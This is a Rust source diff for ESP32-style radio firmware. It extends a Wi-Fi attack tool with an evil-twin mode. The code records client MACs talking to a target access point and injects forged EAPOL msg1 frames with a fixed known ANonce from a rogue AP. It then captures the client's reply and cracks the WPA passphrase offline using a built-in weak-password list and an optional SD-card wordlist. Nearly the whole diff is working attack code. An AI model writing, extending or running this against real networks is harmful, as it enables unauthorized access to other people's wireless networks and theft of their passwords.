@@ -71,9 +71,9 @@ pub struct DetResult {
 
 /// Outcome of a WPA handshake capture + offline crack attempt.
 pub struct HsOutcome {
-    pub eapol: u32,                    // EAPOL frames seen (progress / capture evidence)
-    pub captured: bool,                // a full msg1 + msg2 for the target was extracted
-    pub cracked: Option<&'static str>, // the passphrase, if a built-in candidate matched
+    pub eapol: u32,             // EAPOL frames seen (progress / capture evidence)
+    pub captured: bool,         // a usable handshake for the target was extracted
+    pub cracked: Option<String>, // the passphrase, if a built-in or wordlist candidate matched
 }
 
 // ------------------------- detector RX callback --------------------------
@@ -172,6 +172,19 @@ static HS: HsCell = HsCell(core::cell::UnsafeCell::new(HsState::ZERO));
 // touching HS (a `&HsState` peek would alias the cb's `&mut` — UB under -O3/LTO).
 static HS_M1: AtomicBool = AtomicBool::new(false);
 static HS_M2: AtomicBool = AtomicBool::new(false);
+// Most recent client MAC seen talking TO our BSSID, published for msg1 injection
+// (packed into 2 u32 + a ready flag so the capture loop reads it without aliasing HS).
+static HS_CLIENT_HI: AtomicU32 = AtomicU32::new(0); // MAC bytes 0..2
+static HS_CLIENT_LO: AtomicU32 = AtomicU32::new(0); // MAC bytes 2..6
+static HS_CLIENT_RDY: AtomicBool = AtomicBool::new(false);
+// Evil-twin only: accept the msg2 whose replay counter echoes OUR injected msg1, so
+// the captured MIC is keyed to the ANonce WE know. 0 = accept any (passive sniff).
+static WANT_REPLAY: AtomicU32 = AtomicU32::new(0);
+
+/// Fixed ANonce the evil twin injects in its msg1 — we must KNOW it to crack the
+/// client's msg2. Real APs randomise; a constant is fine since only WE use it.
+const EVIL_ANONCE: [u8; 32] = [0xA5; 32];
+const INJECT_REPLAY: u32 = 1000; // replay counter for our injected msg1 (> the AP's ~1)
 
 fn handshake_cb(pkt: esp_radio::wifi::sniffer::PromiscuousPkt<'_>) {
     let d = pkt.data;
@@ -181,8 +194,21 @@ fn handshake_cb(pkt: esp_radio::wifi::sniffer::PromiscuousPkt<'_>) {
     }
     // is this frame from/to the target BSSID? confirms we are on the right channel.
     let target = unsafe { (&*HS.0.get()).target };
-    if d.len() >= 22 && (d[4..10] == target || d[10..16] == target || d[16..22] == target) {
-        SNIFF_TARGET.fetch_add(1, Ordering::Relaxed);
+    if d.len() >= 22 {
+        if d[4..10] == target || d[10..16] == target || d[16..22] == target {
+            SNIFF_TARGET.fetch_add(1, Ordering::Relaxed);
+        }
+        // a frame addressed TO our BSSID (addr1) from a client (addr2) -> remember the
+        // client so the evil twin can inject msg1 at it.
+        if d[4..10] == target && d[10..16] != target {
+            let c = &d[10..16];
+            HS_CLIENT_HI.store(((c[0] as u32) << 8) | c[1] as u32, Ordering::Relaxed);
+            HS_CLIENT_LO.store(
+                ((c[2] as u32) << 24) | ((c[3] as u32) << 16) | ((c[4] as u32) << 8) | c[5] as u32,
+                Ordering::Relaxed,
+            );
+            HS_CLIENT_RDY.store(true, Ordering::Relaxed);
+        }
     }
     // loose EAPOL-ethertype probe (independent of parse_eapol) + capture the first
     // matching frame's raw bytes once, for offline diagnosis.
@@ -225,21 +251,26 @@ fn handshake_cb(pkt: esp_radio::wifi::sniffer::PromiscuousPkt<'_>) {
             HS_M1.store(true, Ordering::Relaxed);
         }
         2 => {
-            st.snonce = k.nonce;
-            st.mic = k.mic;
-            st.cli_mac = k.sta;
-            st.key_ver = k.key_ver;
-            let n = k.frame.len().min(256);
-            st.eapol[..n].copy_from_slice(&k.frame[..n]);
-            // zero the MIC field (16 B at 802.1X-frame offset 4 + 77 = 81) for the verify
-            if n >= 97 {
-                for b in &mut st.eapol[81..97] {
-                    *b = 0;
+            // In evil-twin mode only keep the msg2 that answers OUR injected msg1
+            // (matching replay counter) so its MIC is keyed to the ANonce we know.
+            let want = WANT_REPLAY.load(Ordering::Relaxed);
+            if want == 0 || (k.replay as u32) == want {
+                st.snonce = k.nonce;
+                st.mic = k.mic;
+                st.cli_mac = k.sta;
+                st.key_ver = k.key_ver;
+                let n = k.frame.len().min(256);
+                st.eapol[..n].copy_from_slice(&k.frame[..n]);
+                // zero the MIC field (16 B at 802.1X-frame offset 4 + 77 = 81) for the verify
+                if n >= 97 {
+                    for b in &mut st.eapol[81..97] {
+                        *b = 0;
+                    }
                 }
+                st.eapol_len = n;
+                st.have_m2 = true;
+                HS_M2.store(true, Ordering::Relaxed);
             }
-            st.eapol_len = n;
-            st.have_m2 = true;
-            HS_M2.store(true, Ordering::Relaxed);
         }
         _ => {}
     }
@@ -658,12 +689,13 @@ impl Radio {
         ssid: &str,
         bssid: [u8; 6],
         channel: u8,
+        extra: Option<&[u8]>,
         tick: impl FnMut(u32) -> bool,
     ) -> Option<HsOutcome> {
         if !self.ensure_wifi() {
             return None;
         }
-        self.capture_and_crack(ssid, bssid, channel, "sniff", tick)
+        self.capture_and_crack(ssid, bssid, channel, "sniff", extra, None, tick)
     }
 
     /// Shared capture + offline-crack core. The caller must have brought WiFi up
@@ -679,6 +711,8 @@ impl Radio {
         bssid: [u8; 6],
         channel: u8,
         mode: &str,
+        extra: Option<&[u8]>,
+        inject: Option<[u8; 32]>,
         mut tick: impl FnMut(u32) -> bool,
     ) -> Option<HsOutcome> {
         EAPOL_COUNT.store(0, Ordering::Relaxed);
@@ -689,6 +723,9 @@ impl Radio {
         DBG_LEN.store(0, Ordering::Relaxed);
         HS_M1.store(false, Ordering::Relaxed);
         HS_M2.store(false, Ordering::Relaxed);
+        HS_CLIENT_RDY.store(false, Ordering::Relaxed);
+        // evil-twin (inject) mode only keeps the msg2 echoing our injected replay.
+        WANT_REPLAY.store(if inject.is_some() { INJECT_REPLAY } else { 0 }, Ordering::Relaxed);
         // SAFETY: written before promiscuous mode is on, so no cb is running yet.
         unsafe {
             *HS.0.get() = HsState::ZERO;
@@ -707,15 +744,37 @@ impl Radio {
         esp_println::println!("[HS:{}] capture on ch{}", mode, channel);
         let delay = Delay::new();
         let mut ticks = 0u32;
+        let mut m1buf = [0u8; wifi_frames::EAPOL_M1_LEN];
         loop {
+            // EVIL-TWIN: inject our own msg1 (known ANonce, high replay) at the most
+            // recently seen client each round, so its msg2 is keyed to an ANonce we
+            // control (msg1 is a non-QoS data frame -> an allowed send_raw_frame subtype).
+            if let Some(anonce) = inject {
+                if HS_CLIENT_RDY.load(Ordering::Relaxed) {
+                    let hi = HS_CLIENT_HI.load(Ordering::Relaxed);
+                    let lo = HS_CLIENT_LO.load(Ordering::Relaxed);
+                    let client = [
+                        (hi >> 8) as u8,
+                        hi as u8,
+                        (lo >> 24) as u8,
+                        (lo >> 16) as u8,
+                        (lo >> 8) as u8,
+                        lo as u8,
+                    ];
+                    let n = wifi_frames::eapol_m1(&mut m1buf, client, bssid, &anonce, INJECT_REPLAY as u64);
+                    if let Some(i) = self.wifi_ifaces.as_mut() {
+                        let _ = i.sniffer.send_raw_frame(false, &m1buf[..n], true);
+                    }
+                }
+            }
             delay.delay_millis(200);
             ticks += 1;
             // poll progress via the atomics only — must NOT form a reference into HS
             // while the cb may be writing it on the WiFi task (that would alias).
             let got = HS_M1.load(Ordering::Relaxed) && HS_M2.load(Ordering::Relaxed);
             let eapol = EAPOL_COUNT.load(Ordering::Relaxed);
-            if got || ticks % 5 == 0 {
-                // ~1 Hz serial heartbeat so the 2 min window doesn't flood the log.
+            if got || ticks % 25 == 0 {
+                // ~5 s serial heartbeat so the 2 min window doesn't flood the log.
                 esp_println::println!(
                     "[HS:{}] ch{} total={} data={} tgt={} eth={} eapol={} m1={} m2={}",
                     mode,
@@ -749,7 +808,14 @@ impl Radio {
         }
         // SAFETY: promiscuous mode is off now; the cb is quiesced.
         let snap = unsafe { *HS.0.get() };
-        if !(snap.have_m1 && snap.have_m2 && snap.eapol_len > 0) {
+        // Passive sniff needs BOTH nonces off-air (msg1 + msg2). Evil-twin supplies the
+        // ANonce itself (we injected it), so it only needs the client's msg2.
+        let ok = if inject.is_some() {
+            snap.have_m2 && snap.eapol_len > 0
+        } else {
+            snap.have_m1 && snap.have_m2 && snap.eapol_len > 0
+        };
+        if !ok {
             return Some(HsOutcome { eapol, captured: false, cracked: None });
         }
         // assemble the handshake exactly as wpa::check_passphrase expects
@@ -760,22 +826,29 @@ impl Radio {
         hs.ssid_len = sl;
         hs.ap_mac = bssid;
         hs.cli_mac = snap.cli_mac;
-        hs.anonce = snap.anonce;
+        hs.anonce = inject.unwrap_or(snap.anonce); // evil-twin: the ANonce we injected
         hs.snonce = snap.snonce;
         hs.mic = snap.mic;
         hs.key_ver = snap.key_ver;
         let el = snap.eapol_len.min(256);
         hs.eapol[..el].copy_from_slice(&snap.eapol[..el]);
         hs.eapol_len = el;
-        // offline crack against the built-in weak list (PBKDF2 is slow; abortable)
-        let mut cracked = None;
+        // offline crack: the built-in weak list first (PBKDF2 is slow; abortable),
+        // then the optional SD wordlist (`extra`, streamed line by line).
+        let mut cracked: Option<String> = None;
         for (idx, pw) in Self::WIFI_PASSWORDS.iter().enumerate() {
             if !tick(idx as u32) {
                 break;
             }
             if wpa::check_passphrase(&hs, pw) {
-                cracked = Some(*pw);
+                cracked = Some((*pw).into());
                 break;
+            }
+        }
+        if cracked.is_none() {
+            if let Some(bytes) = extra {
+                let base = Self::WIFI_PASSWORDS.len() as u32;
+                cracked = wpa::crack_bytes(&hs, bytes, |i| tick(base + i));
             }
         }
         Some(HsOutcome { eapol, captured: true, cracked })
@@ -793,6 +866,7 @@ impl Radio {
         ssid: &str,
         channel: u8,
         throwaway: &str,
+        extra: Option<&[u8]>,
         tick: impl FnMut(u32) -> bool,
     ) -> Option<HsOutcome> {
         use esp_radio::wifi::ap::AccessPointConfig;
@@ -823,8 +897,9 @@ impl Radio {
         self.wifi_ctrl = Some(c);
         self.wifi_ifaces = Some(ifs);
         esp_println::println!("[HS:twin] rogue AP '{}' up on ch{}", ssid, channel);
-        // capture targets OUR OWN bssid: sniff our msg1 (ANonce) + the client's msg2.
-        let out = self.capture_and_crack(ssid, ap_mac, channel, "twin", tick);
+        // capture targets OUR OWN bssid; we inject msg1 with a known ANonce (EVIL_ANONCE)
+        // so the client's msg2 is crackable even though we never see our own self-TX.
+        let out = self.capture_and_crack(ssid, ap_mac, channel, "twin", extra, Some(EVIL_ANONCE), tick);
         self.deinit_wifi(); // tear the rogue AP down
         out
     }
